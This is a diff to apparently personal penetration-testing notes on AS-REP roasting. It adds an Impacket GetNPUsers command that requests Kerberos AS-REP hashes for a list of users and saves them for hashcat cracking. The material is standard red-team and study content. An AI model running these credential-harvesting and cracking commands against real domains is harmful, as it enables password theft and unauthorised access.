@@ -91,7 +91,8 @@ Takes _Do not require Kerberos preauthentication_ to be enabled (disabled by def
 
 #### From Linux with Impacket-GetNPUsers
 
-Impacket-GetNPUsers on GitHub: https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
+Impacket-GetNPUsers on GitHub: https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py \
+and wiki: https://www.aldeid.com/wiki/Impacket/GetNPUsers
 ```
 $ impacket-GetNPUsers -dc-ip $TargetDcIp -request -outputfile hashes_as-rep_to_roast.txt organisation.com/any_user
 $ hashcat --help | grep -i 'kerberos' # look for "AS-REP" in this case
@@ -111,9 +112,9 @@ sudo hashcat -m 18200 hashes_retrieved_with_Rubeus_on_Windows /usr/share/wordlis
 
 #### Users to AS-REQ roast
 
-To get only the users with option _Do not require Kerberos preauthentication_ enabled on Linux:
+To get all users with option _Do not require Kerberos preauthentication_ enabled from Linux, with a user list file:
 ```
-$ impacket-GetNPUsers -dc-ip $TargetDcIp # No options
+$ impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $IpDomainController 'somedomain.com'
 ```
 and on Windows:
 ```
